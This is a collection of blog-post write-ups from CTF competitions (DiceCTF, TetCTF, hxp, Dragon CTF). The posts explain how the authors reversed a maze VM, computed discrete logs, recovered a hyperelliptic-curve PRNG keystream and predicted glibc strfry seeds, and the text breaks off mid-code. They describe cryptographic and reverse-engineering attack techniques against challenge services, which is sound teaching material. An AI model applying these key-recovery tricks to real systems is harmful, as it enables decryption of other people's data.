[{"content":"Challenge Summary Lost in Your Eyes is a reverse engineering challenge in DiceCTF 2021 with ten solves (334 points).\n Your eyes are like a maze, and I hate mazes, so help me escape.\n We are given a binary which takes an input and outputs either :) or :(. If you win a smiley face on the remote server, you are additionally given the flag.\nSolution This challenge is solved by harrier in collaboration with Mystiz. The solution is written in the prespective of harrier.\nPart I: Reversing the virtual machine Since this is a reverse question with a binary, I decided to open it with IDA. This is a simple VM-type binary, with the instruction code stored directly inside.\nIt looked so simple to me at the beginning, and I wonder why no one has solved it? After a bit of reversing and dynamically debugging, I know I was wrong.\nThe code of the binary itself is simple. It is a simple VM with the below variables\n Eight one-byte state registers ($R_0, R_1, \u0026hellip;, R_7$), a two-byte instruction pointer ($p$), an one-byte direction register ($d=1, 2, 3, 4$) deciding how the instruction pointer move, an one-byte select register ($k$) deciding the index of register for subsequent operations, and 65536 one-byte memory ($M_0, M_1, \u0026hellip;, M_{65535}$) storing the instructions and data.  Moreover, each byte in the memory represents an instruction, and the instruction set is defined below.\n   Value Operation     0 do nothing   1 - 8 $k \\leftarrow 0$, \u0026hellip;, $k \\leftarrow 7$   9 - 16 $R_k \\leftarrow R_0$, \u0026hellip;, $R_k \\leftarrow R_7$   17 $R_k \\leftarrow R_k + 1$   18 $R_k \\leftarrow R_k - 1$   19 $R_k \\leftarrow R_6 + R_7$   20 $R_k \\leftarrow R_6 - R_7$   21 $R_k \\leftarrow R_6 \\times R_7$   22 $R_k \\leftarrow \\text{floor}(R_6 / R_7)$   23 $R_k \\leftarrow R_6\\ \\text{mod}\\ R_7$   24 $R_k \\leftarrow \\text{~}R_k$   25 $R_k \\leftarrow -R_k$   26 $R_k \\leftarrow R_6\\ \\text{and}\\ R_7$   27 $R_k \\leftarrow R_6\\ \\text{or}\\ R_7$   28 $R_k \\leftarrow R_6\\ \\text{xor}\\ R_7$   29 $R_k \\leftarrow R_6 == R_7$   30 $R_k \\leftarrow R_6 \u0026lt; R_7$   31 $256R_0+R_1 \\leftarrow p, R_2 \\leftarrow d$   32 keycheck   33 $R_k \\leftarrow M_{256R_0 + R_1}$   34 $M_{256R_0 + R_1} \\leftarrow R_k$   35 $p \\leftarrow 256R_0 + R_1, d \\leftarrow R_2$   36 $R_k \\leftarrow \\text{input}$   37 $\\text{print}\\ R_k$   38 - 41 $d \\leftarrow 1$, \u0026hellip;, $d \\leftarrow 4$    Keycheck is the only curious instruction, where I don\u0026rsquo;t really know why it even exists. While I was reversing, I am only able to realize it is used perform some fatal checks.\nPart II: Building an emulator As the VM code is so simple, I decided to write an emulator in Python for ease of testing. It is not hard to write an emulation given that I have fully reversed the VM.\nSince the instruction code is embedded in the binary, I used gef to extract the code part, and while in emulation I translate the code to human (me) readable instruction for further reverse. I thought I could get the flag by just reading and parsing the translated code, and figuring out the whole logic. I was wrong and it was far more complicated than that.\nWith the emulator I was able to produce some code trace with various input, here\u0026rsquo;s some debug log I generated, with state of the VM and instruction it ran:\nCurrent state: [0, 46, 1, 22, 41, 35, 23, 0] 6 50 / 16 0 50/16 REGSEL = 6 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 6 49 / 16 0 49/16 LOAD REG[6] 0/46 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 48 / 16 0 48/16 REGSEL = 7 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 47 / 16 0 47/16 REG[7] = REG[6] == REG[7] Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 46 / 16 0 46/16 KEYCHECK REG[7] OK Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 45 / 16 3 45/16 SETMODE 3 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 45 / 15 2 45/15 SETMODE 2 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 46 / 15 2 47/15 REG[7] = REG[4] a/b is the notation I used to express instruction pointers, hereby $p = 256a + b$.\nI yield thousands of debug lines like the one above, and I tried to reverse the input process logic, and I realize there is a loop to detect what is my input, and it loop through to see whether the input matched those in the accepted characters.\nHow the characters are matched? Only here I realize the meaning of the keycheck operation. It is simply an if: If the condition holds, the instruction pointer will move two steps forward. Otherwise it will move only one.\nAlso, I was able to generate a list of possible inputs for the first byte, but then I was stuck and didn\u0026rsquo;t know how to do.\nPart III: Visualizing the inner program This part is written in the prespective of Mystiz.\nI decided to join harrier on this challenge at some point of time. At that moment, he have reversed all of the VM and part of the inner program. I want to know what proportation of the inner program he has reversed.\nAt first, I tried to use graphviz for visualization. The results are pretty dull, and most nodes have both the in-degrees and out-degrees being one.\nThis is not surprising, since the nodes have out-degrees larger than one only if they are branches. However, one interesting point from this is, in most of the time, if x1/y1 transits to x2/y2, then $|x_1-x_2|+|y_1+y_2|=1$\u0026hellip; Sounds like they are transited to adjacent grids in each instruction. I recalled some esolangs like Piet and Befunge, where the instruction pointers are actually 2D-coordinates. Although they are not equal, I had an idea to transform the whole thing into a two-dimensional grid. Well, maybe I should use HTML tables to visualize this. Since harrier is tracing the instructions executed, I can integrate it and generate a heatmap to check what is being covered.\nWow, this is pretty impressive. Now we can see that only a small proportion of the code in the inner program is visited. One thing that caught our attention is the maze on the top-left corner. Well, it seemed impossible for us to traverse inside the maze, since there are no arrows and we are very likely unable to turn without arrows.\nWe are able to identify a few zones inside the internal program:\n Request for input Payload area Loop structure The failing and the winning gadgets Maze  Part IV: Generating random ideas While testing with random inputs, it seemed that the input will be filling in 35/22, 35/23 and etc.\nMy first idea is to see whether if we can overwrite 35/1 by overflowing the input buffer. I was expecting that the original code can be corrupted by writing up to 35/255, then it will be wrapped back to 35/0 and 35/1. Turns out this is not possible since only the bottom right zone, with dimensions $47\\times34$, could be overwritten, filling line by line. The excessive input will simply be ignored.\nFrom the visualization, we can see that there are several print gadgets. For example, there is a failing gadget (which prints :() on the bottom left input part that will be traversed when a character outside the character set is given. There is also one on the upper middle of the map and one in the top right. Mystiz has identified that the former one has the same instructions as the one on the bottom left, so it would also be a failing gadget. The objective is simple: To make the instruction pointer end up on the top-right part, on the winning gadget.\nTo achieve this, one idea we had is to find ways to jump to the winning gadget directly. We found that the instruction pointer will be moving into the payload area when we are given a sufficiently long input. Therefore we can actually execute the payloads we sent.\nKnowing that, we tried to use the set address instruction (byte 0x23) to jump to the win widget. Unfortunately this does not work, since 0x23 is not allowed as an input.\nWe then come up an idea to try to use the conditional keycheck operation on the side of the square to escape out of the box. However keycheck does not allow an arrow pointing to itself. This does not work as well.\nIt seems that the only possible way is to navigate in the maze properly to get to the win gadget. But how is it possible if the maze do not have arrows?\nWell, there is an untouched part of the program - the arrow-putting gadget. With $R_4 \u0026lt; 4$, it can be used to put arrows on to the maze with the set register instruction (byte 0x21). We reversed it and and expected that it behaves as the following Python code snippet:\nfor x in range(1, 21): for y in range(1, 21): # We are not allowed to overwrite the \u0026#34;load address\u0026#34; instructions # i.e., the walls. if M[256*x + y] == 0x23: continue if R[4] \u0026lt; 4: M[256 * x + y] = 0x26 + R[4] # 0x26 0x27 0x28 0x29 # ↑ → ↓ ← Our objective is updated once again. Now the goal is to craft a payload to put appropriate arrows to let us navigate through the maze.\nBut wait, there is a check after the maze. Basically, there are some instructions in the maze to write $R_3, R_4, R_5$ and $R_7$. All we need to do is to walk through the maze in a specific order to pass the check.\nSo we finally have a clear target: design a route for the maze to pass through all the checks and get to the winning gadget.\nPart V: Crafting a smiley face In each iteration, I can control 8 registers, initially with $R_0 = 0, R_1 = 5, R_6 = x$ and $R_7 = y$. Initially, I copied the coordinates by $R_2 \\leftarrow x$ and $R_3 \\leftarrow y$ for further operations. Moreover, $R_0$ and $R_1$ can be used to build up to an arbitrary number in a few instructions.\nThe idea is to encode few arrows into a vertical block.\nHowever, the size of our input is pretty small. We need to make use of some techniques to save space. For instance, we can encode few arrows into one condition (Instead of checking x == x0 and y == y0, we can use y \u0026gt; y0, y mod 6 or even x == y as long as it traverses to the goal).\nWriting the payload is tiring without some auxiliary tools, so I used spreadsheet to write the instructions and wrote a simple CSV parser to convert those instruction to the input payload. After some unknown hours of manual work, I have eventually crafted the payload. This is how it looks in spreadsheet. 🙈\nIt is then converted as a payload to the binary. This is the emulated result that eventually returns a smiley face.\nPart VI: Final thoughts It was really a fun reverse challenge, while being easy to begin yet challenging to finish. Every part of the challenge is well-designed. The maze, the constraints, and even the instructions that making this challenge to work. That was an exciting and mind-blowing experience to explore and dig into rabbit holes of the challenge bit by bit.\nThanks to Mystiz for the great insights and the visualization, I think having the visualization itself is already having half of the challenge solved. 😀\n","permalink":"https://b6a.black/posts/2021-02-09-dicectf-liye/","summary":"Lost in Your Eyes is a reverse engineering challenge in DiceCTF 2021 with ten solves (334 points). We are given a binary which takes an input and outputs either :) or :(. If you win a smiley face on the remote server, you are additionally given the flag.","title":"DiceCTF 2021: Lost in your Eyes"},{"content":"TetCTF is the first CTF I have played in 2021. I recalled from last year that they have cool challenges. This year, there are three crypto challenges. In particular, unevaluated is the hardest among them. Although I did not solve them, I dug into rabbit holes and had a lot of struggle, uh, fun.\nChallenge Summary There is a 128-bit prime $p$. Define $\\cdot: \\mathbb{Z}_{p^2}^2\\times\\mathbb{Z}_{p^2}^2\\rightarrow\\mathbb{Z}_{p^2}^2$ by\n\\[(x_1, y_1)\\cdot(x_2, y_2) := \\left(\\left(x_1x_2-y_1y_2\\right)\\ \\text{mod}\\ p^2, \\left(x_1y_2+y_1x_2\\right)\\ \\text{mod}\\ p^2\\right),\\]\nwhere $(x_1, y_1), (x_2, y_2) \\in \\mathbb{Z}_{p^2}^2$. Also, define for $k\\in\\mathbb{N}$ and $G \\in \\mathbb{Z}_{p^2}^2$, $G^k = G \\cdot G \\cdot ... \\cdot G$. Given that $G, H \\in \\mathbb{Z}_{p^2}^2$, the objective is to find $k\\in\\mathbb{N}\\cap\\left[0, 2^{256}\\right)$ such that $H = G^k$.\nSolution Clickbaited! This writeup is not original and has referred (or stolen) to several sources (Thanks rkm0959 and CryptoHack!). I would like to write this up for my own reference. Anyway, this is more like a story than a solution.  Part I: What is the order composed of? Since $p$ and $k$ are respectively 128 and 256 bits long, it is expected to recover two out of $k\\ \\text{mod}\\ p$, $k\\ \\text{mod}\\ q$ and $k\\ \\text{mod}\\ r$ to compute $k$. It is interesting to see the order being a product of three primes $p, q, r$, with $q | (p-1)$ and $r | (p+1)$.\nI have defined $\\text{norm}: \\mathbb{Z}_{p^2}^2 \\rightarrow \\mathbb{Z}_{p^2}$ by $\\text{norm}(x, y) = (x^2 + y^2)\\ \\text{mod}\\ p^2$ and experimented a bit and discovered some of the properties:\n The imaginary part of $G^{pr}$ is zero. $\\text{norm}(G^{pq}) = 1$, and  If we are working on $\\mathbb{Z}_p$ instead of $\\mathbb{Z}_{p^2}^2$, then\n The imaginary part of $G^r$ is zero. $\\text{norm}(G^q) = 1$, and  The following code snipped is used to verify the above properties.\n# Under mod n P = complex_pow(G, p*r, n) # P.im == 0 dQ = norm(complex_pow(G, p*q, n), n) # dQ == 1 # Under mod p P = complex_pow(G, r, p) # P.im == 0 dQ = norm(complex_pow(G, q, p), p) # dQ == 1 This make me think: If we consider a polar coordinate representation where $G = \\rho e^{i\\theta}$, with $\\rho\\in R$ and $\\theta\\in A$, then $R \\cong \\mathbb{Z}_{pq}$ and $A \\cong \\mathbb{Z}_{pr}$. Hence, we can imagine that the subgroup that $G$ generates is isomorphic to $\\mathbb{Z}_{pq}\\times\\mathbb{Z}_{pr}$.\nWell, they are not important though. This is interesting however.  Part II: Stealing the ideas from an existing cryptosystem Solving discrete log under modulo $n^2$ does not seem difficult. For example, we can see from Paillier cryptosystem that discrete logarithms under modulo $n^2$ can be computed easily. In this way, we can compute $x\\ \\text{mod}\\ p$ with:\n\\[x \\equiv \\frac{\\mathcal{L}(h^{p-1}\\ \\text{mod}\\ p^2)}{\\mathcal{L}(g^{p-1}\\ \\text{mod}\\ p^2)}\\ (\\text{mod}\\ p),\\]\nwhere $\\mathcal{L}(x) = \\frac{x-1}{p}$, like how a ciphertext is decrypted with the Paillier cryptosystem. Hence we have $x\\ \\text{mod}\\ p$.\nMini Checklist\n $x\\ \\text{mod}\\ p$ $x\\ \\text{mod}\\ q$ $x\\ \\text{mod}\\ r$   Part III: Solving 128-bit discrete logarithm Let's try to work on $\\mathbb{Z}_{p}^2$ instead of $\\mathbb{Z}_{p^2}^2$. This reminded me the challenge galiver in ASIS CTF Finals 2020. I searched the discussion on CryptoHack's Discord server, and found...\n  hellman\u0026rsquo;s comment on galiver back then.\n  Okay, works for 128-bit $p$ rather fast. So this must be discrete logarithm. Let's try it? Since the imaginary part for $G^r, H^r$ are zero, I tried discrete_log(H^r, G^r, q) on Sage. After five minutes, my PC crashed. I could not solve it during the CTF. After the game, rkm0959 publishes the writeup on the CTF and he used h.log(g) and have got it working. In his writeup, he uses a norm map which is isomorphic to the subgroup that $G^r$ generates.\np = 206109322179011817882783419945552366363 q = 103054661089505908941391709972776183181 r = 17175776848250984823565284995462697197 G = (20878314020629522511110696411629430299663617500650083274468525283663940214962, 16739915489749335460111660035712237713219278122190661324570170645550234520364) H = (11048898386036746197306883207419421777457078734258168057000593553461884996107, 34230477038891719323025391618998268890391645779869016241994899690290519616973) Zp = GF(p) g = Zp(G[0]**2 + G[1]**2) # equivalently, g = Zp(complex_pow(G, r, p).re) h = Zp(H[0]**2 + H[1]**2) # and h = Zp(complex_pow(H, r, p).re) assert g^q == 1 x_mod_q = h.log(g) print(\u0026#39;x % q =\u0026#39;, x_mod_q) # 26176203815975575469683683780455489251 Takeaway. Sage is powerful. It tooks 3 minutes for my PC to compute the discrete log, where the time complexity should be $\\mathcal{O}(\\sqrt{q})$. Also, do not use discrete_log(h, g). Use h.log(g) instead.  Mini Checklist\n $x\\ \\text{mod}\\ p$ $x\\ \\text{mod}\\ q$ $x\\ \\text{mod}\\ r$   Part IV: Combining the building blocks With Chinese remainder theorem, we are able to recover $x_0 := x\\ \\text{mod}\\ pq$. It may not equal to $x$, but they are differ from a small multiple of $pq$. We can simply compute $x_0 + kpq$ for some small $k\\in\\mathbb{N}$ until $k$ is obtained. After that we have the flag - TetCTF{h0m0m0rph1sm_1s_0ur_fr13nd-mobi:*100*231199111007#}. This challenge makes me think more about discrete logarithm, and I am amazed by the capability of Sage. I am still wondering why discrete logarithm of a 128-bit prime can be computed in just a few minutes...\n","permalink":"https://b6a.black/posts/2021-01-03-tetctf-unevaluated/","summary":"TetCTF is the first CTF I have played in 2021. I recalled from last year that they have cool challenges. This year, there are three crypto challenges. In particular, unevaluated is the hardest among them. Although I did not solve them, I dug into rabbit holes and had a lot of struggle, uh, fun.\nChallenge Summary There is a 128-bit prime $p$. Define $\\cdot: \\mathbb{Z}_{p^2}^2\\times\\mathbb{Z}_{p^2}^2\\rightarrow\\mathbb{Z}_{p^2}^2$ by\n\\[(x_1, y_1)\\cdot(x_2, y_2) := \\left(\\left(x_1x_2-y_1y_2\\right)\\ \\text{mod}\\ p^2, \\left(x_1y_2+y_1x_2\\right)\\ \\text{mod}\\ p^2\\right),\\]","title":"TetCTF 2021: unevaluated"},{"content":"I was teamed up to play hxp CTF as @blackb6a last week. The hxp team had come up with a collection of hard challenges. In particular, there are two series of crypto challenges with a total of five parts. I will be writing on the hyper challenge and some follow-up and unanswered questions regarding to hyperelliptic curves.\nⓘ 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝘀𝗼𝘂𝗿𝗰𝗲𝘀 𝘀𝘁𝗮𝘁𝗲𝗱 𝘁𝗵𝗮𝘁 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗺𝗶𝘀𝗹𝗲𝗮𝗱𝗶𝗻𝗴\nSeriously. I knew nothing on hyperelliptic curves prior to the CTF. The writeup is solely based on what I learnt during the game, and may not be accurate. If you found a mistake, please do not hesitate to contact me. Many thanks! :smile:\n Challenge Summary In this series of challenge, the message Hello! The flag is: hxp{...} is xorred with an bytestream generated by an PRNG. In particular, the only difference between hyper (crypto, 294 points) and hyperhyper (crypto, 714 points) is the message lengths, respectively 45 and 93.\nWithout doubt, the most crucial element for this challenge is the PRNG, which is based on Jacobian of hyperelliptic curves. In this challenge, the Jacobian $\\mathcal{J}$ of a hyperelliptic curve $\\mathcal{H}$ of genus 3 over $\\mathbb{Z}_p$ is used. $\\mathcal{H}$ is defined by:\n\\[\\mathcal{H}: y^2 \\equiv x^7 + x\\ (\\text{mod}\\ p).\\]\nThree constant points $G_1, G_2, G_3$ from $\\mathcal{J}$ are picked and three integers $k_1, k_2, k_3$ are picked randomly as the seed. Finally, define $H_n \\in \\mathcal{J}$ by $H_n := k_1^nG_1 + k_2^nG_2 + k_3^nG_3$ for $n\\in\\mathbb{N}$. If we write $H_n = \\left(u_n\\left(x\\right), v_n\\left(x\\right)\\right)$, where\n\\[\\begin{cases} u_n(x) := u_{n0} + u_{n1} x + u_{n2} x^2 + u_{n3} x^3 \\\\ v_n(x) := v_{n0} + v_{n1} x + v_{n2} x^2 \\end{cases},\\]\nthen the random stream would be $(u_{10}, u_{11}, u_{12}, v_{10}, v_{11}, v_{12}, u_{20}, u_{21}, ...)$, where each of $u_{ij}$ and $v_{ij}$'s is of 8 bytes.\nSolution Part I: Comparing hyper and hyperhyper One thing that made me very curious at first glance: We are given 24 bytes of the random bytestream from the known message in both hyper and hyperhyper, why is hyperhyper an independent question? If we are able to recover internal state for the PRNG, wouldn't it be evident to solve the both parts?\nOf course, I would have not questions if I have understood the PRNG. Since the first 24 bytes are known, we have $u_1(x)$. For hyper, we gotta recover the following 21 bytes, which is enough by recovering $v_1(x)$. After all, the points are given in Mumford representation. With that said, if a point $P\\left(u\\left(x\\right), v\\left(x\\right)\\right)\\in\\mathcal{J}$, the below properties are satisfied1:\n  $u(x)$ is monic, $f(x) \\equiv [v(x)]^2\\ \\left(\\text{mod}\\ u\\left(x\\right)\\right)$, and $\\deg\\left(v\\left(x\\right)\\right) \u0026lt; \\deg\\left(u\\left(x\\right)\\right) \\leq 3$.   It is hinted from the second property that the objective is to find a modular square root for $f(x)$ under modulo $u(x)$.\nPart II: Midnight thoughts It was midnight when I realize this and I could not immediately think of an appropriate approach. I was even once expanding everything:\nSuppose that we have $u(x) := x^3 + rx^2 + sx + t$ and $v(x) := ax^2 + bx + c$. Then the following modular congruences hold:\n\\[\\begin{cases} -r^5 + 4r^3s - 3r^2t - 3rs^2 + 2st - a^2r^2 + 2abr + a^2s - 2ac - b^2 \\equiv 0 \\\\ -r^4s + 3r^2s^2 - 4rst - s^3 + r^3t + t^2 + 1 - a^2rs + 2abs + a^2t - 2bc \\equiv 0 \\\\ -r^4t + 3r^2st - 2rt^2 - s^2t - a^2rt + 2abt - c^2 \\equiv 0 \\end{cases}(\\text{mod}\\ p).\\]\nI must be very sleepy back then.\nPart III: Wake up, wake up! After [enter an arbitrary number] hours of sleep, I woke up and immediately recalled Tonelli-Shanks algorithm. Basically we are able to apply the algorithm to compute modular square root, even with modulo $u(x)$. Since $u(x)$ is a degree 3 polynomial over $\\mathbb{Z}_p$, the order for $\\mathcal{G} := \\text{GF}(p)[x]/u(x)$ would be a factor of $p^3 - 1$. Knowing the order, we can apply Tonelli-Shanks to compute a modular square root for $f(x)$. After all, $v(x)$ would be one of them.\nThe rest is trivial after we have $v_1(x)$ computed. Xorring the output with the keystream, we have the message: Hello! The flag is: hxp{ez_P4rT_i5_ez__tL0Cm}.\nPart IV: Mysteries of hyperelliptic curves I am not going to talk about solutions anymore. This section contains a list of unproved properties which looked truthy for me. Those questions came to my mind while attempting hyperhyper, while I have no proofs. The questions are no means useful for solving the questions, but I think they are helpful in pairing-based cryptography. They are very likely used somewhere anyway.  Let $\\mathcal{J}$ be the Jacobian of a hyperelliptic curve of genus 3. Suppose that $\\sigma$ is the order of $G_1, G_2, G_3\\in\\mathcal{J}$.\n Question 1. Is $a_1G_1 + a_2G_2 + a_3G_3$ also has an order $\\sigma$ given that $gcd(a_i, \\sigma)=1$? Question 2. Define $S := \\{k_1G_1 + k_2G_2 + k_3G_3 \\in \\mathcal{J}: k_1, k_2, k_3\\in\\mathbb{Z}\\}$. Is $\\left|S\\right| = \\sigma^3$? Question 3. Let $(\\mathbb{Z}_p^3, +)$ be a group and define $x = (x_1, x_2, x_3), y = (y_1, y_2, y_3) \\in\\mathbb{Z}_p^3$. Suppose $x+y = (x_1+y_1, x_2+y_2, x_3+y_3)$. Is $(\\mathbb{Z}_p^3, +)$ isomorphic to $S$?    Jasper Scholten, Frederik Vercauteren (2003). \u0026quot;An Introduction to Elliptic and Hyperelliptic Curve Cryptography and the NTRU Cryptosystem\u0026quot;\nhttps://homes.esat.kuleuven.be/~fvercaut/papers/cc03.pdf [return]   ","permalink":"https://b6a.black/posts/2020-12-20-hxpctf-hyper/","summary":"I was teamed up to play hxp CTF as @blackb6a last week. The hxp team had come up with a collection of hard challenges. In particular, there are two series of crypto challenges with a total of five parts. I will be writing on the hyper challenge and some follow-up and unanswered questions regarding to hyperelliptic curves.\nⓘ 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝘀𝗼𝘂𝗿𝗰𝗲𝘀 𝘀𝘁𝗮𝘁𝗲𝗱 𝘁𝗵𝗮𝘁 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗺𝗶𝘀𝗹𝗲𝗮𝗱𝗶𝗻𝗴\nSeriously. I knew nothing on hyperelliptic curves prior to the CTF.","title":"hxp CTF 2020: Hyper"},{"content":"Dragon CTF 2020 is definitely had my best CTF moments. There are big brain moments and I have been mind-blown for multiple times during the game. This time we have teamed up with @blackb6a. I have solved all the crypto challenges and two challenges with my teammates.\nThere are three challenges writeup in this post:\n Bit Flip (parts 2 and 3) Frying in motion babykok  Bit Flip (Crypto, 155+324+343 points) Solved by Mystiz.\nChallenge Summary At the beginning, a 128-bit alice_secret (denoted as $a$) is generated. We are given an oracle that allows us to input a 256-bit value $v$. An PRNG $R$ uses $a\\oplus v$ to derive:\n a 512-bit prime $p$ that is used for Diffie-Hellman, and a 64-bit secret $a$ that is Alice's secret key.  For each oracle call, the following will be printed\n The number of rng.getbits(512) calls for $p$ to be a prime, Bob's public key (which is generated randomly in each call), $B$, The encrypted flag (with AES-CBC \u0026amp; key is derived from the DH shared key):  Of course, the devil is in the detail. The AES-CBC key is derived as follows:\ndh_shared_key = 1337 ^ pow(B, a, p) key = long_to_bytes(dh_shared_key, 16)[:16] Furthermore, the PRNG is simple. It is maintaining a 256-bit state $s$. 512-bit and 64-bit numbers are generated respectively with:\ndef getbits(bits=512): output = sha256(long_to_bytes(s, 32)).digest() + sha256(long_to_bytes(s+1, 32)).digest() s += 2 return output def getbits(bits=64): output = sha256(long_to_bytes(s, 32)).digest()[-8:] s += 1 return output The plot twist This is the setting for part one. Parts two and three are pretty similar though.\n Parts 2 and 3 are not returning Bob's public key, and Part 3 uses the prime $p$ and check if $q := 2p+1$ is a prime. The prime $q$ (instead of $p$) is used for DH.  Solution Part I: The real bit-flipping Bit Flip 1 was solved in about 45 minutes. Basically we are able to recover $v$ from the number of rng.getbits(512) calls. Since I am sure that there will be writeups on this part available online, I am skipping this part.\nI am just going to admit that I am lazy.  Part II: A nightmare on long_to_bytes Bit Flip 3 was solved in 1 hour - and we were the first to solve. But wait, why isn't part II on Bit Flip 2? The reason is simply because just I cannot solve it (yet).\n  defund had the same question, too.\n  The prime used for Diffie-Hellman can be 513-bit long. This makes the AES key derivation interesting - as long_to_bytes(x, 16) actually prepend null bytes until the output size is a multiple of 16. For example:\n\u0026gt;\u0026gt;\u0026gt; long_to_bytes(2**127, 16).hex() \u0026#39;80000000000000000000000000000000\u0026#39; \u0026gt;\u0026gt;\u0026gt; long_to_bytes(2**128, 16).hex() \u0026#39;0000000000000000000000000000000100000000000000000000000000000000\u0026#39; Luckily (or unluckily) the shared key can be as large as 513 bits long. In that case, the first block would be 00 00 ... 00 00 01 - and this is the AES key.\nWe do not even need to know Alice's nor Bob's key. Basically there is around 25% chance for the DH shared key to be 513-bit. When it happens, the constant key is used and we are able to decrypt the flag - DrgnS{C0nst_A3S_K3y_1111111111111!}. First blood 🩸!\nPart III: Playing mind-games on Bit Flip 2 Bit Flip 2 was solved in about 12 hours. I was mind-blown when I know da wae. Since the DH key could never be 513 bits long anymore, we can no longer exploit in the way as described in Bit Flip 3.\nWait. This made me very puzzled: How do we find the shared key (or $g^{ab}\\ (\\text{mod}\\ p)$) if Bob is not telling us anything?  Basically we have three options:\n Make $a = 0$. This implies that $g^{ab} \\equiv 1$, resulting in a constant key. Find $a$ and $p$ such that $g^a\\in\\mathbb{Z}_p^*$ has a small order. Hence $\\{g^{ab}\\in\\mathbb{Z}_p^*\\ |\\ b\\in\\mathbb{Z}\\}$ can be exhausted feasibly. Make $p$ 385-bit long (or 1-bit, 129-bit or 257-bit). Then we are able to reuse the exploit on Bit Flip 3.  There is a point of time that over 10 teams have solved Bit Flip 2 while only hxp and us have solved Bit Flip 3. If option 3 is the way to go, the number of solves would not be the same. Moreover, option 2 is barely possible in a perspective of math. That said, unless there is a vulnerability that I am not awared of, we may need to make $a = 0$. That is equivalent to rng.getbits(64) == 0 and thus a 64-bit proof-of-work. Possible?\nDuring the research, I was wondering if there is a proof-of-work database that has a list of payloads with many trailing zeros as its hash. I was even wondering if there is someone ever able to solve a 64-bit proof-of-work (particularly on SHA256). Turns out I am too naive - some are able to solve a 76-bit proof-of-work in around 10 minutes. Who? The bitcoin network.\n  Let\u0026rsquo;s appreciate the number of zeros\u0026hellip;\n  The block hashing algorithm for Bitcoin is SHA256. This is how block 125552 (the smallest hash as of June 2011) is computed:\nd = bytes.fromhex(\u0026#39;0100000081cd02ab7e569e8bcd9317e2fe99f2de44d49ab2b8851ba4a30\u0026#39; + \u0026#39;8000000000000e320b6c2fffc8d750423db8b1eb942ae710e951ed797f7\u0026#39; + \u0026#39;affc8892b0f1fc122bc7f5d74df2b9441a42a14695\u0026#39;) m = hashlib.sha256(d).digest() print(m.hex()) # b9d751533593ac10cdfb7b8e03cad8babc67d8eaeac0a3699b82857dacac9390 h = hashlib.sha256(m).digest() print(h.hex()) # 1dbd981fe6985776b644b173a4d0385ddc1aa2a829688d1e0000000000000000 The above hash ends with 8 null bytes. If the below seed generates a prime in its first call of rng.getbits(512), then a = 0:\nseed = 0xb9d751533593ac10cdfb7b8e03cad8babc67d8eaeac0a3699b82857dacac938c.\nUnfortunately it is not. Luckily there are many inputs (available on the Bitcoin network) that generates eight trailing null bytes as its hash. We can simply look at the blocks and find the one we need. For me, I was using the block API from blockcypher.com to retrieve and compute the preimage of hashes. Eventually block 657972 satisfies our needs and the Alice's secret key will be $a = 0$.\nThat said, the AES key would be 00 00 ... 00 05 38 when $a = 0$ - and we are able to decrypt the flag: DrgnS{B1tc0in_p0w3r_crypt0_brut3}! :tada:\nFrying in motion (Crypto, 324 points) Solved by Mystiz.\nChallenge Summary The challenge is simple. Upon connecting to the challenge server,\n 257 HEX characters are generated, strfry-ed for 0x140000 times. Nothing is returned. (This took around 5 seconds) Players are allowed to send up to 4096 bytes. The server returns the strfry-ed input. 64 HEX characters (denote as fry_buf) strfry-ed and returned. The player is expected to find fry_buf.  More importantly, the challenge server has a timeout of 20 seconds. Hence, you have to compute from the strfry-ed response in 15 seconds.\nSolution Part I: The first encounter  \u0026quot;WTF. Yet another strfry question? It must be very boring.\u0026quot; ~ Mystiz\n This is the first comment I made to the challenge. It is actually much interesting than I thought and I have spent a good 5 hours for the challenge.\nThe previous CTFs (for example, challenge from ångstromCTF 2020 and DawgCTF 2020) exploited on the small seed space that can be exhausted. In the previous versions of libc, the seeds for strfry is given by time(NULL) ^ getpid(). I was trying to print time(NULL) and getpid() alongside with the strfry result, but the seed does not check out. What? Maybe the world is not peaceful anymore in libc 2.31-0ubuntu9. Let's download the source code and have a read.\nPart II: Code-reading game Let's verify the first point - is the implementation for strfry changed?\n// string/strfry.c  char * strfry (char *string) { // omitted...  if (!init) { static char state[32]; rdata.state = NULL; __initstate_r (random_bits (), state, sizeof (state), \u0026amp;rdata); init = 1; } // omitted... }// include/random-bits.h  static inline uint32_t random_bits (void) { struct timespec tv; __clock_gettime (CLOCK_MONOTONIC, \u0026amp;tv); /* Shuffle the lower bits to minimize the clock bias. */ uint32_t ret = tv.tv_nsec ^ tv.tv_sec; ret ^= (ret \u0026lt;\u0026lt; 24) | (ret \u0026gt;\u0026gt; 8); return ret; } Although the string is fried in the same way, the seed is changed! Since the seed is 32 bits long, maybe I can just exhaust it. However it takes 5 seconds to strfry a 257-byte long string for 0x140000 times, it is not feasible to brute force with the challenge implementation. Let's read how random numbers are generated.\n// stdlib/random_r.c  int __initstate_r (unsigned int seed, char *arg_state, size_t n, struct random_data *buf) { // omitted...  int type; if (n \u0026gt;= BREAK_3) type = n \u0026lt; BREAK_4 ? TYPE_3 : TYPE_4; else if (n \u0026lt; BREAK_1) { if (n \u0026lt; BREAK_0) goto fail; type = TYPE_0; } else type = n \u0026lt; BREAK_2 ? TYPE_1 : TYPE_2; int degree = random_poly_info.degrees[type]; int separation = random_poly_info.seps[type]; buf-\u0026gt;rand_type = type; buf-\u0026gt;rand_sep = separation; buf-\u0026gt;rand_deg = degree; int32_t *state = \u0026amp;((int32_t *) arg_state)[1];\t/* First location. */ /* Must set END_PTR before srandom. */ buf-\u0026gt;end_ptr = \u0026amp;state[degree]; buf-\u0026gt;state = state; __srandom_r (seed, buf); state[-1] = TYPE_0; if (type != TYPE_0) state[-1] = (buf-\u0026gt;rptr - state) * MAX_TYPES + type; // omitted... } strfry uses a 32-byte state, which indicates that TYPE_1 PRNG is used. Seven 32-bit unsigned integer is derived from the seed (denote it as s[0], s[1], ..., s[6]) and set the counter c := 0. This is the equivalent Python code.\nclass GlibcRandom: def __init__(self, seed): self.init_state(seed) [self.next() for 